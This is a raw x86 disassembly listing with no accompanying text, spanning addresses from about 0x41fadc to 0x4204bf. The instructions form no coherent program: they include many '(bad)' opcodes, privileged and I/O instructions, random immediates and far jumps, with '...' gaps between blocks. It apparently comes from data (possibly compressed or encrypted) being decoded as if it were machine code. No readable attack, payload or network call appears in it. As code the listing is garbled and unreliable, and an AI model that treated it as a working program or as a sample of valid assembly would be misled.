  41fadc:	outs   dx,DWORD PTR ds:[esi]
  41fadd:	(bad)  
  41fade:	pop    esp
  41fadf:	pop    ebx
  41fae0:	xchg   ebx,eax
  41fae1:	or     al,0xd7
  41fae3:	pop    edi
  41fae4:	cmc    
  41fae5:	mov    ebp,0xa50c188d
  41faea:	inc    edx
  41faeb:	lods   eax,DWORD PTR ds:[esi]
  41faec:	ins    BYTE PTR es:[edi],dx
  41faed:	lock adc eax,0xdd9baccf
  41faf3:	mov    eax,0x95c51b8a
  41faf8:	xchg   edx,eax
  41faf9:	push   cs
  41fafa:	adc    al,0x4
  41fafc:	fwait
  41fafd:	dec    ebx
  41fafe:	(bad)  
  41faff:	adc    BYTE PTR [ecx-0x78bc2664],al
  41fb05:	(bad)  [ecx]
  41fb07:	sbb    ebp,DWORD PTR [ebp-0xf18a905]
  41fb0d:	ins    DWORD PTR es:[edi],dx
  41fb0e:	mov    ch,0x5e
  41fb10:	arpl   WORD PTR [edx],si
  41fb12:	dec    edi
  41fb13:	loope  0x41fb1d
  41fb15:	mov    cl,0xd6
  41fb17:	pop    esp
  41fb18:	xchg   ecx,eax
  41fb19:	imul   DWORD PTR [ebp-0x5e]
  41fb1c:	sub    DWORD PTR ds:[edi],edx
  41fb1f:	ror    BYTE PTR [eax+ecx*1-0x8],cl
  41fb23:	or     bh,dh
  41fb25:	dec    ebx
  41fb26:	cmp    bh,al
  41fb28:	sbb    DWORD PTR [esi-0x7e],edi
  41fb2b:	push   eax
  41fb2c:	xor    dl,BYTE PTR [edi]
  41fb2e:	mov    al,ds:0xedab3343
  41fb33:	mov    ah,0xfe
  41fb35:	test   al,0x24
  41fb37:	in     al,0x39
  41fb39:	out    dx,al
  41fb3a:	add    al,0xcd
  41fb3c:	imul   ebp,DWORD PTR [edi+0x16],0x57e9d120
  41fb43:	(bad)  
  41fb44:	and    edx,DWORD PTR [esi]
  41fb46:	lds    edx,FWORD PTR [edi+edi*2+0x54]
  41fb4a:	fneni(8087 only) 
  41fb4c:	nop
  41fb4d:	mov    ?,WORD PTR [ebx+0x15]
  41fb50:	cmp    eax,0x6a03705d
  41fb55:	inc    eax
  41fb56:	repnz (bad) 
  41fb58:	pusha  
  41fb59:	ficomp WORD PTR [edx]
  41fb5b:	push   es
  41fb5c:	xor    eax,0xcebb100d
  41fb61:	pusha  
  41fb62:	in     al,dx
  41fb63:	dec    edi
  41fb64:	add    ecx,edx
  41fb66:	addr16 call 0x836f:0x51c013
  41fb6e:	ss aas 
  41fb70:	mov    al,0x80
  41fb72:	repnz (bad) 
  41fb74:	cmp    ch,bl
  41fb76:	pop    ecx
  41fb77:	cmovl  edx,DWORD PTR [esi+ebx*8]
  41fb7b:	fst    QWORD PTR [ebx]
  41fb7d:	clc    
  41fb7e:	sub    BYTE PTR [esi],al
  41fb80:	inc    DWORD PTR ds:0xa4800bd2
  41fb86:	pusha  
  41fb87:	and    ecx,0x6bb154df
  41fb8d:	mov    ecx,0x8200c9e8
  41fb92:	mov    eax,0xaf3e85db
  41fb97:	test   eax,0x5a09a778
  41fb9c:	add    cl,BYTE PTR [esi-0x7c]
  41fb9f:	and    BYTE PTR [ebx-0xf],ah
  41fba2:	and    dh,ch
  41fba4:	dec    eax
  41fba5:	icebp  
  41fba6:	out    dx,al
  41fba7:	pop    ds
  41fba8:	mov    edi,0x3b8ba6e1
  41fbad:	fst    QWORD PTR [ecx+0x61]
  41fbb0:	mov    ecx,DWORD PTR [ebx+ecx*8+0x55]
  41fbb4:	test   al,0xb4
  41fbb6:	shl    BYTE PTR [eax],0xaf
  41fbb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbba:	enter  0x42dd,0x4e
  41fbbe:	add    al,0x8
  41fbc0:	and    BYTE PTR [eax],al
	...
  41fc32:	add    BYTE PTR [eax],al
  41fc34:	inc    ecx
  41fc35:	icebp  
  41fc36:	(bad)
  41fc39:	hlt    
  41fc3a:	gs icebp 
  41fc3c:	push   edx
  41fc3d:	sub    eax,0x36d18ad2
  41fc42:	fistp  WORD PTR [ebx]
  41fc44:	nop
  41fc45:	push   esp
  41fc46:	add    DWORD PTR [eax],eax
  41fc48:	cmc    
  41fc49:	add    BYTE PTR [eax],al
  41fc4b:	add    BYTE PTR [ecx-0x6a],dh
  41fc4e:	sub    al,0x6b
  41fc50:	sbb    BYTE PTR [ecx],cl
  41fc52:	or     eax,0x9361225a
  41fc57:	adc    BYTE PTR [ebx],cl
  41fc59:	and    al,0xed
  41fc5b:	mov    ecx,0xe5222cdf
  41fc60:	daa    
  41fc61:	das    
  41fc62:	pushf  
  41fc63:	jmp    0x75ae9ce6
  41fc68:	dec    ebx
  41fc69:	inc    ebx
  41fc6a:	in     eax,dx
  41fc6b:	call   0xf55db467
  41fc70:	pop    edi
  41fc71:	jg     0x41fcee
  41fc73:	popf   
  41fc74:	pop    esp
  41fc75:	pop    esp
  41fc76:	add    BYTE PTR [edi-0x744fe2d0],dl
  41fc7c:	adc    eax,DWORD PTR ds:[ebx+edi*2+0x8]
  41fc81:	pop    es
  41fc82:	push   edx
  41fc83:	lock fsubr DWORD PTR ss:[ebx]
  41fc87:	pop    ebp
  41fc88:	ror    ch,1
  41fc8a:	or     BYTE PTR [esi+eiz*1],dl
  41fc8d:	and    esp,esi
  41fc8f:	ret    
  41fc90:	nop
  41fc91:	ror    BYTE PTR [edi-0x6e985144],1
  41fc97:	or     eax,0xc1e4e0e1
  41fc9c:	jecxz  0x41fd15
  41fc9e:	stc    
  41fc9f:	and    BYTE PTR [ebp+0x68328e15],cl
  41fca5:	ret    0x321a
  41fca8:	push   edx
  41fca9:	jno    0x41fc9f
  41fcab:	idiv   edx
  41fcad:	adc    ecx,esp
  41fcaf:	cdq    
  41fcb0:	pusha  
  41fcb1:	pop    es
  41fcb2:	pushf  
  41fcb3:	inc    ebp
  41fcb4:	(bad)  
  41fcb5:	mov    ebx,0xaef07e4
  41fcba:	cmp    esi,DWORD PTR [ebp-0x6e6675c2]
  41fcc0:	bound  esp,QWORD PTR [edx+0x39ad7e2]
  41fcc6:	push   es
  41fcc7:	stos   BYTE PTR es:[edi],al
  41fcc8:	ins    BYTE PTR es:[edi],dx
  41fcc9:	lods   eax,DWORD PTR ds:[esi]
  41fcca:	nop
  41fccb:	inc    ecx
  41fccc:	aas    
  41fccd:	mov    ebp,0x6dacfed6
  41fcd2:	sub    al,0x39
  41fcd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcd5:	hlt    
  41fcd6:	mov    ds:0xe149eb54,eax
  41fcdb:	in     eax,dx
  41fcdc:	cmp    esi,0xb
  41fcdf:	loope  0x41fd2c
  41fce1:	dec    ebx
  41fce2:	(bad)  
  41fce3:	cdq    
  41fce4:	jnp    0x41fd2b
  41fce6:	not    BYTE PTR [edi]
  41fce8:	addr16 hlt 
  41fcea:	std    
  41fceb:	jae    0x41fc86
  41fced:	sub    eax,DWORD PTR [esi]
  41fcef:	mov    esp,0x2a926c9
  41fcf4:	lods   al,BYTE PTR ds:[esi]
  41fcf5:	fs int 0xb1
  41fcf8:	sbb    eax,0xa4ff96d3
  41fcfd:	sar    BYTE PTR [eax+0x33],0x95
  41fd01:	or     eax,0xe86e1b35
  41fd06:	pop    edi
  41fd07:	mov    cl,0x2f
  41fd09:	(bad)  
  41fd0a:	cmp    BYTE PTR [ebp+eiz*1-0x63],dh
  41fd0e:	xchg   edi,eax
  41fd0f:	sub    eax,0x8f3cd53d
  41fd14:	inc    esp
  41fd15:	pop    edx
  41fd16:	outs   dx,DWORD PTR ds:[esi]
  41fd17:	and    BYTE PTR [edi+0x37ada206],dh
  41fd1d:	add    ah,BYTE PTR [edx-0x41]
  41fd20:	push   ecx
  41fd21:	enter  0xd64b,0x1b
  41fd25:	push   esp
  41fd26:	repnz xchg edx,eax
  41fd28:	mov    dl,0xfb
  41fd2a:	push   ds
  41fd2b:	dec    esi
  41fd2c:	sub    al,bl
  41fd2e:	mov    ebp,DWORD PTR [edx+0x52]
  41fd31:	fisub  DWORD PTR [ecx-0x386d710]
  41fd37:	sbb    esp,0x5e
  41fd3a:	sub    DWORD PTR [esi+0x5bf346be],0x6
	...
  41fdb4:	add    eax,0x7b197956
  41fdb9:	aas    
  41fdba:	gs pop esi
  41fdbc:	repnz lahf 
  41fdbe:	and    al,0x2d
  41fdc0:	push   ss
  41fdc1:	add    al,0xfa
  41fdc3:	pop    ecx
  41fdc4:	test   DWORD PTR [ebp+0x1],edx
  41fdc7:	add    ch,dh
  41fdc9:	add    BYTE PTR [eax],al
  41fdcb:	add    dh,cl
  41fdcd:	mov    ebp,0xc1522a13
  41fdd2:	xchg   esp,eax
  41fdd3:	mov    WORD PTR [ebx+eiz*8],gs
  41fdd6:	mov    bl,0x5
  41fdd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdd9:	dec    ecx
  41fdda:	mov    bl,0xb0
  41fddc:	mov    bl,BYTE PTR [ebx-0xd34c942]
  41fde2:	or     bh,BYTE PTR [edx-0x6c04cad8]
  41fde8:	mov    al,0x48
  41fdea:	adc    edx,DWORD PTR [ebx-0x7a]
  41fded:	lahf   
  41fdee:	and    edx,ebx
  41fdf0:	fldl2t 
  41fdf2:	scas   eax,DWORD PTR es:[edi]
  41fdf3:	push   0xd2a79979
  41fdf8:	sbb    BYTE PTR [edx+0x55fd9544],bl
  41fdfe:	jno    0x41fdb3
  41fe00:	ret    0xb3d0
  41fe03:	retf   
  41fe04:	test   al,bl
  41fe06:	cmp    esi,DWORD PTR [edx+eax*2+0x14]
  41fe0a:	mov    edx,0x58078882
  41fe0f:	int    0xca
  41fe11:	jo     0x41fdcf
  41fe13:	push   es
  41fe14:	xor    eax,0x1c16da35
  41fe19:	cmp    DWORD PTR [ebx],ebx
  41fe1b:	lods   eax,DWORD PTR ds:[esi]
  41fe1c:	sbb    BYTE PTR [ebp+0x28],dl
  41fe1f:	mov    ds:0xcab78c28,al
  41fe24:	mov    edi,0x6973636
  41fe29:	xchg   edi,eax
  41fe2a:	fldenv [edx+0x40]
  41fe2d:	jo     0x41fdda
  41fe2f:	dec    ebx
  41fe30:	xor    DWORD PTR cs:[ebp-0x4056095c],eax
  41fe37:	(bad)  
  41fe38:	cld    
  41fe39:	mov    bh,0x7a
  41fe3b:	inc    eax
  41fe3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe3d:	sub    dh,BYTE PTR [bx+di]
  41fe40:	xchg   ecx,eax
  41fe41:	push   ebp
  41fe42:	or     eax,0x418b998a
  41fe47:	aaa    
  41fe48:	scas   al,BYTE PTR es:[edi]
  41fe49:	xchg   DWORD PTR [esp+ecx*8+0x626ce50e],ecx
  41fe50:	add    ebx,ebx
  41fe52:	popa   
  41fe53:	add    dl,BYTE PTR [ebx+0x7b63e5fe]
  41fe59:	mov    ?,ebx
  41fe5b:	add    BYTE PTR [ebp+edx*4+0x1d6165e9],al
  41fe62:	jne    0x41fea0
  41fe64:	lock jg 0x41fe19
  41fe67:	cwde   
  41fe68:	push   esi
  41fe69:	lea    edx,[ebp+0x168bdbea]
  41fe6f:	push   ds
  41fe70:	cdq    
  41fe71:	mov    esp,0x22a03335
  41fe76:	mov    cl,0xeb
  41fe78:	add    al,0xd4
  41fe7a:	fmul   QWORD PTR [ecx-0x5ea59665]
  41fe80:	lock mov esp,0xa93c1960
  41fe86:	pop    ebx
  41fe87:	out    dx,eax
  41fe88:	adc    al,0xfb
  41fe8a:	sub    al,0x4d
  41fe8c:	add    DWORD PTR [ebx+0x27df4b8e],edi
  41fe92:	inc    ebp
  41fe93:	nop
  41fe94:	push   es
  41fe95:	pop    es
  41fe96:	mov    fs,WORD PTR [esi+0x20]
  41fe99:	jno    0x41fee3
  41fe9b:	aaa    
  41fe9c:	or     ecx,DWORD PTR [edi-0x5c85d3ae]
  41fea2:	xor    ch,bh
  41fea4:	adc    al,0x89
  41fea6:	arpl   WORD PTR [eax-0x47],dx
  41fea9:	jmp    0x41fef1
  41feab:	add    al,0x36
  41fead:	xchg   BYTE PTR [edx+ecx*4],ah
  41feb0:	lods   eax,DWORD PTR ds:[esi]
  41feb1:	iret   
  41feb2:	sub    al,0x1f
  41feb4:	xor    BYTE PTR [edx+0x2],dl
  41feb7:	xlat   BYTE PTR ds:[ebx]
  41feb8:	cs and eax,0xdad40bbe
  41febe:	ret    
  41febf:	jl     0x41feac
	...
  41ff31:	add    BYTE PTR [eax],al
  41ff33:	add    BYTE PTR [ecx-0xda40a3],bh
  41ff39:	out    0xbb,eax
  41ff3b:	fisttp QWORD PTR [edi+0x7]
  41ff3e:	mov    WORD PTR [edi-0x7e7afba8],?
  41ff44:	jp     0x41ff9c
  41ff46:	add    DWORD PTR [eax],eax
  41ff48:	cmc    
  41ff49:	add    BYTE PTR [eax],al
  41ff4b:	add    BYTE PTR [ebp-0x3d],al
  41ff4e:	xchg   ebx,eax
  41ff4f:	fwait
  41ff50:	retf   
  41ff51:	push   edi
  41ff52:	hlt    
  41ff53:	inc    esp
  41ff54:	mov    ds:0xbc25d36f,al
  41ff59:	mov    ebp,0x53039738
  41ff5e:	ins    DWORD PTR es:[edi],dx
  41ff5f:	idiv   DWORD PTR [edi]
  41ff61:	test   DWORD PTR [esi-0x6f],esp
  41ff64:	jmp    0xbd70:0xd5cfa93b
  41ff6b:	or     DWORD PTR [ecx+eiz*4+0x3ca2889e],0xffffff96
  41ff73:	test   eax,0xc3ed0611
  41ff78:	push   0x7441d8a9
  41ff7d:	cmp    DWORD PTR [esi+0x69b71647],0xffffffe7
  41ff84:	xor    BYTE PTR [esi-0x26],0x1f
  41ff88:	push   edi
  41ff89:	mov    dh,0x94
  41ff8b:	jns    0x420003
  41ff8d:	xchg   ecx,eax
  41ff8e:	(bad)  
  41ff8f:	aad    0x71
  41ff91:	push   esi
  41ff92:	hlt    
  41ff93:	jne    0x41ffac
  41ff95:	cwde   
  41ff96:	mov    esp,0x39a44d5d
  41ff9b:	jns    0x41ffbf
  41ff9d:	pop    esi
  41ff9e:	leave  
  41ff9f:	fwait
  41ffa0:	xchg   esi,eax
  41ffa1:	pop    edx
  41ffa2:	enter  0x9193,0xc
  41ffa6:	jecxz  0x41ffe9
  41ffa8:	jmp    0x41ff2e
  41ffaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffab:	push   cs
  41ffac:	pop    ss
  41ffad:	(bad)  
  41ffae:	pop    esi
  41ffaf:	sbb    DWORD PTR [ecx-0x45],ebx
  41ffb2:	mov    eax,ds:0x6f290dbb
  41ffb7:	repnz dec edx
  41ffb9:	(bad)  
  41ffba:	iret   
  41ffbb:	cmp    bl,BYTE PTR [eax]
  41ffbd:	inc    edi
  41ffbe:	in     eax,dx
  41ffbf:	and    edi,DWORD PTR [edx]
  41ffc1:	sbb    eax,0xa8b49974
  41ffc6:	shl    DWORD PTR [edi],0xa
  41ffc9:	mov    bh,0x82
  41ffcb:	repz inc edi
  41ffcd:	push   edx
  41ffce:	adc    eax,0xeabd5e9a
  41ffd3:	int3   
  41ffd4:	pop    esi
  41ffd5:	dec    ebx
  41ffd6:	xchg   edi,eax
  41ffd7:	leave  
  41ffd8:	xchg   ebx,eax
  41ffd9:	iret   
  41ffda:	dec    eax
  41ffdb:	idiv   BYTE PTR [edx-0x7d]
  41ffde:	add    cx,WORD PTR [ebp-0x8]
  41ffe2:	cwde   
  41ffe3:	sub    dh,bl
  41ffe5:	lahf   
  41ffe6:	shl    dh,1
  41ffe8:	xchg   DWORD PTR [esi+0x29],edi
  41ffeb:	inc    ebx
  41ffec:	mov    ecx,0x2bce21ec
  41fff1:	cmp    dl,ch
  41fff3:	into   
  41fff4:	(bad)  
  41fff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fff6:	sub    al,0x2
  41fff8:	iret   
  41fff9:	pop    eax
  41fffa:	in     al,dx
  41fffb:	aas    
  41fffc:	xchg   ecx,eax
  41fffd:	mov    edi,0x1ab3d7d4
  420002:	ins    BYTE PTR es:[edi],dx
  420003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420004:	test   BYTE PTR [esp+edx*8+0x79c82b10],ch
  42000b:	ja     0x41ffe9
  42000d:	or     BYTE PTR fs:[esi-0x26],bh
  420011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420012:	and    ecx,DWORD PTR [ebx+0x76]
  420015:	mov    eax,0xcc231a85
  42001a:	js     0x420087
  42001c:	ds enter 0x97d6,0x1a
  420021:	or     al,0x2f
  420023:	dec    ecx
  420024:	fdiv   st,st(6)
  420026:	lods   al,BYTE PTR ds:[esi]
  420027:	sbb    ch,BYTE PTR [esi-0x73]
  42002a:	iret   
  42002b:	nop
  42002c:	mov    edx,es
  42002e:	cdq    
  42002f:	or     BYTE PTR [edx-0x5e],dl
  420032:	mov    bh,0xe4
  420034:	push   ebx
  420035:	push   edx
  420036:	jmp    0x42004d
  420038:	pop    ecx
  420039:	fistp  DWORD PTR [edi+0x77ad3d33]
  42003f:	xchg   edx,eax
  420040:	outs   dx,BYTE PTR ds:[esi]
	...
  4200b1:	add    BYTE PTR [eax],al
  4200b3:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  4200b9:	mov    ebx,0xe891ffdf
  4200be:	arpl   WORD PTR [eax-0x28849be0],ax
  4200c4:	outs   dx,DWORD PTR ds:[esi]
  4200c5:	push   edi
  4200c6:	add    DWORD PTR [eax],eax
  4200c8:	cmc    
  4200c9:	add    BYTE PTR [eax],al
  4200cb:	add    cl,bl
  4200cd:	bound  ebx,QWORD PTR [edi-0x7c]
  4200d0:	pop    esi
  4200d1:	sub    dh,BYTE PTR [edx+0x2699768f]
  4200d7:	ret    
  4200d8:	push   0x4716bcab
  4200dd:	push   ebx
  4200de:	xor    edi,edx
  4200e0:	jns    0x4200d6
  4200e2:	icebp  
  4200e3:	dec    esi
  4200e4:	jl     0x420105
  4200e6:	(bad)  
  4200e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200e8:	mov    al,ds:0xb5c92496
  4200ed:	rol    BYTE PTR [ebp+0x1d],cl
  4200f0:	pop    ss
  4200f1:	loope  0x420105
  4200f3:	nop
  4200f4:	push   edi
  4200f5:	dec    ebx
  4200f6:	and    eax,0x535e6d8d
  4200fb:	jnp    0x4200ab
  4200fd:	aaa    
  4200fe:	sub    BYTE PTR [edx],0x9e
  420101:	inc    eax
  420102:	icebp  
  420103:	into   
  420104:	loope  0x42013b
  420106:	cmp    esp,DWORD PTR [eax+0x5d762049]
  42010c:	sub    al,0x5b
  42010e:	or     BYTE PTR [edx],0xd0
  420111:	ret    
  420112:	xor    DWORD PTR [ecx+esi*2+0x7e],ebx
  420116:	sbb    dl,BYTE PTR [esi-0x5c]
  420119:	adc    DWORD PTR [edi+0x25],ecx
  42011c:	sti    
  42011d:	xor    ah,ch
  42011f:	ror    BYTE PTR [esi+0x1a],1
  420122:	mov    ebx,0x1347da6e
  420127:	xor    al,0xa0
  420129:	cmovbe esi,DWORD PTR [ebp+0x4b]
  42012d:	push   esi
  42012e:	sti    
  42012f:	fstp   TBYTE PTR [edi+ebp*1+0x6940d4ec]
  420136:	or     BYTE PTR [esi+0x45],bh
  420139:	mov    BYTE PTR [edx+edi*4+0x7f],ah
  42013d:	out    0xf1,al
  42013f:	adc    DWORD PTR [ecx+ebp*1+0x313f72e5],eax
  420146:	or     al,0xf1
  420148:	jmp    0x6afe:0x9f3e09bc
  42014f:	and    al,0x9c
  420151:	sub    esp,DWORD PTR [ecx*1+0x764f559b]
  420158:	aas    
  420159:	scas   eax,DWORD PTR es:[edi]
  42015a:	test   al,0x77
  42015c:	cmp    dl,BYTE PTR [eax-0x55]
  42015f:	or     al,0xa1
  420161:	in     eax,dx
  420162:	inc    edi
  420163:	pop    edi
  420164:	jae    0x4200fc
  420166:	mov    bl,0xf8
  420168:	int    0x12
  42016a:	push   0x78
  42016c:	pop    esi
  42016d:	pop    ebp
  42016e:	push   ss
  42016f:	sub    BYTE PTR [esi],ah
  420171:	push   eax
  420172:	push   ds
  420173:	sub    BYTE PTR [ebx+0x3d],ch
  420176:	xor    BYTE PTR [esi+0x42],bh
  420179:	bound  ecx,QWORD PTR [esi-0x2a]
  42017c:	or     DWORD PTR [edi-0x80],esi
  42017f:	inc    esi
  420180:	mov    DWORD PTR [ecx],esp
  420182:	and    DWORD PTR [eax-0x326decdb],edi
  420188:	cli    
  420189:	pop    eax
  42018a:	in     eax,dx
  42018b:	cwde   
  42018c:	dec    ebp
  42018d:	mov    BYTE PTR [ebp+0x1b144aa6],ah
  420193:	xchg   esi,eax
  420194:	mov    ds,WORD PTR [ebp+0x518d641f]
  42019a:	in     eax,0xab
  42019c:	js     0x42014b
  42019e:	mov    ss,WORD PTR [edi]
  4201a0:	std    
  4201a1:	push   0x29
  4201a3:	hlt    
  4201a4:	push   ebp
  4201a5:	in     eax,0x53
  4201a7:	cmp    bh,BYTE PTR [esi+0x163cc58e]
  4201ad:	iret   
  4201ae:	pop    ss
  4201af:	mov    bh,0xdf
  4201b1:	jns    0x420180
  4201b3:	pop    ebp
  4201b4:	sub    al,bl
  4201b6:	std    
  4201b7:	fs in  al,dx
  4201b9:	aaa    
  4201ba:	pop    esp
  4201bb:	scas   al,BYTE PTR es:[edi]
  4201bc:	fdivr  st,st(6)
  4201be:	add    BYTE PTR [edi],bh
  4201c0:	xchg   ebp,eax
	...
  420231:	add    BYTE PTR [eax],al
  420233:	add    BYTE PTR [ecx+0x1b],dl
  420236:	jmp    DWORD PTR [esi-0x1]
  420239:	out    0xd9,al
  42023b:	aas    
  42023c:	mov    DWORD PTR ds:0x556d010,ebx
  420242:	pop    eax
  420243:	xchg   ebp,eax
  420244:	fs pop eax
  420246:	add    DWORD PTR [eax],eax
  420248:	cmc    
  420249:	add    BYTE PTR [eax],al
  42024b:	add    BYTE PTR [ebp+0x25],ch
  42024e:	sub    BYTE PTR [edx],0x35
  420251:	outs   dx,DWORD PTR ds:[esi]
  420252:	pop    DWORD PTR [ebp+0x16]
  420255:	lds    ecx,FWORD PTR [ecx]
  420257:	jno    0x42022e
  420259:	jbe    0x4201e7
  42025b:	push   esi
  42025c:	push   ebx
  42025d:	mov    edi,0x118ca8c7
  420262:	mov    bh,0x91
  420264:	dec    esp
  420265:	add    DWORD PTR [esi-0x68],ebx
  420268:	std    
  420269:	sbb    bl,ah
  42026b:	xchg   edx,eax
  42026c:	inc    edi
  42026d:	imul   ebp,DWORD PTR [ebx+0x35338b17],0xffffff85
  420274:	mov    bl,0xc6
  420276:	mov    ds:0x1ea01e98,eax
  42027b:	pusha  
  42027c:	cmp    dl,BYTE PTR [esi-0x1231a8ac]
  420282:	inc    eax
  420283:	sub    DWORD PTR [edx+0x23],0xffffff87
  420287:	dec    edi
  420288:	fisttp DWORD PTR [eax]
  42028a:	mov    dh,0x23
  42028c:	mov    cs,WORD PTR [ebx+0x55]
  42028f:	and    DWORD PTR [ebx],0xfffffff7
  420292:	sub    esi,DWORD PTR [edx+esi*8]
  420295:	or     al,BYTE PTR [edi]
  420297:	dec    edx
  420298:	mov    cs,edx
  42029a:	jnp    0x42028d
  42029c:	lea    edi,[ebp+0x10506a65]
  4202a2:	les    ecx,FWORD PTR [edx-0x683985bc]
  4202a8:	out    dx,eax
  4202a9:	idiv   DWORD PTR [ecx]
  4202ab:	leave  
  4202ac:	xchg   ecx,eax
  4202ad:	mov    edx,0x24eb5c33
  4202b2:	in     eax,dx
  4202b3:	xchg   ebp,eax
  4202b4:	mov    ah,0x24
  4202b6:	add    BYTE PTR [edx+eiz*8],bl
  4202b9:	fidivr WORD PTR [edx+0x449ac215]
  4202bf:	dec    esi
  4202c0:	and    ah,ch
  4202c2:	mov    cl,0xf0
  4202c4:	jnp    0x4202a1
  4202c6:	mov    bh,0x6a
  4202c8:	dec    ecx
  4202c9:	fwait
  4202ca:	add    ch,BYTE PTR [ebp-0x29]
  4202cd:	push   0xa44772af
  4202d2:	jno    0x4202e1
  4202d4:	jg     0x4202dd
  4202d6:	test   esi,esp
  4202d8:	jnp    0x420302
  4202da:	nop
  4202db:	xchg   ecx,eax
  4202dc:	mov    edx,0x58b9d058
  4202e1:	or     BYTE PTR [esi+0x638ef2df],cl
  4202e7:	inc    eax
  4202e8:	and    ebp,DWORD PTR [esi+0x1dd209df]
  4202ee:	(bad)  
  4202ef:	mov    ch,0xc3
  4202f1:	and    BYTE PTR [eax],dl
  4202f3:	push   0xb72af930
  4202f8:	xchg   edx,eax
  4202f9:	mov    ch,0x94
  4202fb:	or     eax,0xabc11eb9
  420300:	outs   dx,DWORD PTR ds:[esi]
  420301:	or     ebp,DWORD PTR [ecx+0x63285dee]
  420307:	pop    eax
  420308:	xchg   esi,eax
  420309:	jp     0x420355
  42030b:	imul   edx,DWORD PTR [esp+ebp*2],0x8e171370
  420312:	mov    es,WORD PTR [eax-0x56]
  420315:	ins    BYTE PTR es:[edi],dx
  420316:	je     0x4202e4
  420318:	mov    al,0xe8
  42031a:	adc    edi,eax
  42031c:	adc    ecx,DWORD PTR [si+0x5a64]
  420321:	adc    bl,BYTE PTR [edi+0x407fd755]
  420327:	mov    BYTE PTR [ebp+0x14d3e262],dh
  42032d:	mov    eax,ds:0x60151df2
  420332:	ins    BYTE PTR es:[edi],dx
  420333:	test   al,0x13
  420335:	jne    0x42033d
  420337:	inc    esi
  420338:	(bad)  
  420339:	cmp    BYTE PTR [edi],ch
  42033b:	js     0x42031a
  42033d:	mov    ds:0x79a87c,eax
	...
  4203b2:	add    BYTE PTR [eax],al
  4203b4:	cmp    al,0xe7
  4203b6:	imul   ebp,edi,0xfffffffb
  4203b9:	out    dx,eax
  4203ba:	mov    esp,0x889a5af7
  4203bf:	arpl   WORD PTR [ebp+0x59155caa],ax
  4203c5:	pop    ecx
  4203c6:	add    DWORD PTR [eax],eax
  4203c8:	cmc    
  4203c9:	add    BYTE PTR [eax],al
  4203cb:	add    BYTE PTR [ecx-0x6fdf7dd0],dh
  4203d1:	mov    dl,0xe0
  4203d3:	es xchg esp,eax
  4203d5:	dec    eax
  4203d6:	mov    ebp,0xf486b72c
  4203db:	popfw  
  4203dd:	xor    dl,BYTE PTR [esi-0xa]
  4203e0:	dec    esp
  4203e1:	add    eax,0xc9a25353
  4203e6:	inc    sp
  4203e8:	xchg   ebp,eax
  4203e9:	(bad)  [eax-0x48aa1d33]
  4203ef:	and    DWORD PTR [eax],esp
  4203f1:	mov    al,0xb9
  4203f3:	push   ds
  4203f4:	push   ebp
  4203f5:	shr    bl,1
  4203f7:	mov    BYTE PTR [edx],bh
  4203f9:	push   edx
  4203fa:	mov    ah,0x7
  4203fc:	arpl   WORD PTR [edx],bp
  4203fe:	adc    BYTE PTR [eax+0x340f8383],bl
  420404:	std    
  420405:	push   ecx
  420406:	mov    ecx,0x2439c07c
  42040b:	popa   
  42040c:	sub    ebx,esi
  42040e:	ftst   
  420410:	(bad)  
  420411:	jecxz  0x4203e7
  420413:	pop    eax
  420414:	popa   
  420415:	outs   dx,BYTE PTR ds:[esi]
  420416:	nop
  420417:	clc    
  420418:	xchg   ebp,eax
  420419:	(bad)  
  42041a:	jmp    0x9b2fea9b
  42041f:	cmc    
  420420:	push   ecx
  420421:	bnd ja 0x420453
  420424:	xor    al,0x5a
  420426:	sub    eax,0x6716e3ab
  42042b:	dec    ebp
  42042c:	jmp    0x9ab9:0x3850c4cf
  420433:	dec    ebp
  420434:	xchg   ebx,eax
  420435:	mov    ah,0x25
  420437:	mov    eax,ds:0x26782bc8
  42043c:	les    ecx,FWORD PTR [edx-0x42c10bac]
  420442:	jns    0x4203da
  420444:	aad    0x64
  420446:	cmp    esp,ebx
  420448:	outs   dx,BYTE PTR ds:[esi]
  420449:	imul   eax,DWORD PTR [eax+0x68],0x37
  42044d:	in     al,dx
  42044e:	xor    edi,DWORD PTR [esi]
  420450:	sub    BYTE PTR [ecx],dh
  420452:	and    bh,BYTE PTR [ecx]
  420454:	ret    
  420455:	cmp    cl,bh
  420457:	mov    ah,0x8b
  420459:	jmp    0x4203f0
  42045b:	sar    DWORD PTR ds:0x820d784a,1
  420461:	and    al,0x85
  420463:	neg    DWORD PTR [ebp-0x36]
  420466:	and    BYTE PTR [ecx],dl
  420468:	xor    al,0x11
  42046a:	inc    esi
  42046b:	into   
  42046c:	lds    ebp,FWORD PTR [esi-0x54]
  42046f:	cdq    
  420470:	jo     0x42043f
  420472:	or     eax,0x90fc4cb3
  420477:	sub    cl,0xc3
  42047a:	add    dh,cl
  42047c:	sub    BYTE PTR [eax-0x4b69265],0x2a
  420483:	stos   DWORD PTR es:[edi],eax
  420484:	imul   ecx,ebx,0x54
  420487:	jnp    0x4204ef
  420489:	and    eax,ebp
  42048b:	(bad)  
  42048c:	(bad)  
  42048d:	xchg   edx,eax
  42048e:	shl    BYTE PTR [ecx],cl
  420490:	pop    edi
  420491:	pop    edi
  420492:	aas    
  420493:	add    DWORD PTR [edi-0x7b2b766a],eax
  420499:	es fadd st(2),st
  42049c:	loope  0x420498
  42049e:	push   ecx
  42049f:	adc    ah,dl
  4204a1:	push   ebp
  4204a2:	sbb    ebp,DWORD PTR [ebp-0x15]
  4204a5:	aam    0x38
  4204a7:	scas   eax,DWORD PTR es:[edi]
  4204a8:	adc    dl,bh
  4204aa:	cmp    al,0xb1
  4204ac:	and    bh,BYTE PTR [edx]
  4204ae:	jbe    0x420480
  4204b0:	dec    esi
  4204b1:	adc    edx,DWORD PTR [eax]
  4204b3:	inc    esi
  4204b4:	loope  0x4204c8
  4204b6:	(bad)  
  4204b7:	es xchg edx,eax
  4204b9:	(bad)  
  4204bb:	jl     0x42051d
  4204bd:	adc    bl,bl
  4204bf:	ret    
